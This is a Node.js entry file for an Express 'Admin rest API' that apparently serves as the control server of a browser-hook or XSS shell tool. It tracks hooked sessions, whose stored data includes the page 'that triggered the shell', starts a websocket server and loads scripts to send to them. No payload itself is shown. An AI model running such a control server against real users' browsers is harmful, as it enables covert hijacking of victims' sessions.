#!/usr/bin/env node
const express = require("express");
const fs = require("fs");
var app = express();

// app.use(bodyParser.urlencoded({ extended: true }));
// app.use(multer());

app.use(require("./controller"));

app.listen(3000,function(){
	initGlobal();
	console.log("[*] Admin rest API listening to port 3000");
});
/*
	*	
	*	全局变量，同步信息用
	*
*/

global.cache = global.cache ? global.cache : {
	con_pool : {
		//  ${key} : {
		// proxy_reponse : {}
		// origin_page : "",	// 触发shell的原网页内容
		//	req: {},
		// 	recv : {
		// 	},
		// 	con : ""		// connection句柄
		// }
	},
	scripts : []
}
global.checkSessionId = function(id){
	if(global.cache.con_pool[id] == undefined){
		return false;
	}
	return true;
}

global.getSession = function(id){
	return global.cache.con_pool[id].con;
}

require("./websocket-server").run();

function initGlobal(){
	fs.readdir("./scripts",function(err,data){
		console.log("[*] Loading scripts...");
		for(var i = 0;i < data.length;i++){
			fs.readFile("./scripts/"+data[i],'utf8',function(err,d){
				global.cache.scripts.push({"script":d});
			});
		}
		console.log("[√] Load Scripts done.");
	});
}
